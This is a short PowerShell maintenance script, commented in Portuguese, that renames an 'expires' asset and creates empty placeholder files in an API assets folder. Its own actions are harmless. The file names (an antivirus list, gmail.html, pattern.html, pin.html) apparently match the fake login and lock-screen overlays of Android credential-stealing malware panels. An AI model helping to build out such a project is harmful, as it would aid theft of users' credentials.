# fix-assets.ps1
$assetsDir = "api\src\assets"

Set-Location $assetsDir

# Renomeia expires.txt para expires, se necessário
if (Test-Path "expires.txt") {
    Rename-Item -Path "expires.txt" -NewName "expires" -Force
    Write-Host "Renomeado: expires.txt -> expires"
} else {
    Write-Host "expires.txt não encontrado, verificando se 'expires' já existe..."
}

# Garante que outros arquivos existam (cria vazios se faltar)
$files = @(
    "avs_list.txt",
    "push_blocked_list.txt",
    "gmail.html",
    "pattern.html",
    "pin.html",
    "ignore_errors.txt"
)

foreach ($file in $files) {
    if (-not (Test-Path $file)) {
        New-Item -ItemType File -Path $file -Force | Out-Null
        Write-Host "Criado: $file"
    } else {
        Write-Host "OK: $file"
    }
}

Write-Host "`nAssets corrigidos."